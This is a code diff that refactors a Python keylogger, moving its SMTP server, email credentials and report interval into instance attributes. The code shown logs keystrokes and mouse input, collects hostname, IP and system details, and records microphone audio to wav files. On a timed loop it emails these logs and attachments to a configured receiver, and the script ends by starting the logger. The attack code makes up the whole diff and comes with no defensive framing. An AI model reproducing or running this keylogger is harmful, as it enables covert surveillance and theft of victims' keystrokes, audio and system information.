@@ -37,14 +37,21 @@ class KeyLogger:
         email_sender,
         email_receiver,
         cc,
-        magic_word
+        magic_word,
     ):
+        self.interval = time_interval
+        self.smtp_server = smtp_server
+        self.smtp_port = smtp_port
+        self.email_address = email_address
+        self.email_password = email_password
+        self.email_sender = email_sender
+        self.email_receiver = email_receiver
+        self.cc = cc
+        self.magic_word = magic_word
+        self.log = "KeyLogger Started...\n"
         self.keyboard_listener = None
         self.mouse_listener = None
-        self.interval = time_interval
-        self.log = "KeyLogger Started...\n"
         self.word = ""
-        self.magic_word = magic_word
 
     def appendlog(self, string):
         if string:
@@ -82,13 +89,13 @@ class KeyLogger:
 
     def send_mail(self, message):
         send_mail_with_attachment(
-            smtp_server=SMTP_SERVER,
-            smtp_port=SMTP_PORT,
-            email_address=EMAIL_ADDRESS,
-            email_password=EMAIL_PASSWORD,
-            email_sender=EMAIL_SENDER,
-            email_receiver=EMAIL_RECEIVER,
-            cc=EMAIL_CC,
+            smtp_server=self.smtp_server,
+            smtp_port=self.smtp_port,
+            email_address=self.email_address,
+            email_password=self.email_password,
+            email_sender=self.email_sender,
+            email_receiver=self.email_receiver,
+            cc=self.cc,
             path_to_attachment=os.getcwd(),
             attachments=get_wav_and_png_files(),
             subject="Test keylogged - by F3000",
@@ -112,16 +119,16 @@ class KeyLogger:
         processor = platform.processor()
         system = platform.system()
         machine = platform.machine()
-        self.appendlog("\nhostname = " + hostname)
-        self.appendlog("\nip = " + ip)
-        self.appendlog("\nprocessor = " + processor)
-        self.appendlog("\nsystem = " + system)
-        self.appendlog("\nmachine = " + machine)
+        self.appendlog("\nHostname = " + hostname)
+        self.appendlog("\nIP = " + ip)
+        self.appendlog("\nProcessor = " + processor)
+        self.appendlog("\nSystem OS = " + system)
+        self.appendlog("\nMachine architecture = " + machine)
 
     def microphone(self):
         fs = 44100
         channels = 1  # mono
-        seconds = SEND_REPORT_EVERY
+        seconds = self.interval
         obj = wave.open(f"sound_{time.time()}.wav", "w")
         obj.setnchannels(channels)  # mono
         obj.setsampwidth(2)  # Sampling of 16 bit
@@ -171,7 +178,7 @@ class KeyLogger:
             #     except OSError:
             #         print("File is close.")
 
-            time.sleep(SEND_REPORT_EVERY)
+            time.sleep(self.interval)
             self.report()
 
             if self.magic_word != "" and self.magic_word in self.word:
@@ -190,6 +197,6 @@ keylogger = KeyLogger(
     EMAIL_SENDER,
     EMAIL_RECEIVER,
     EMAIL_CC,
-    MAGIC_WORD
+    MAGIC_WORD,
 )
 keylogger.run()
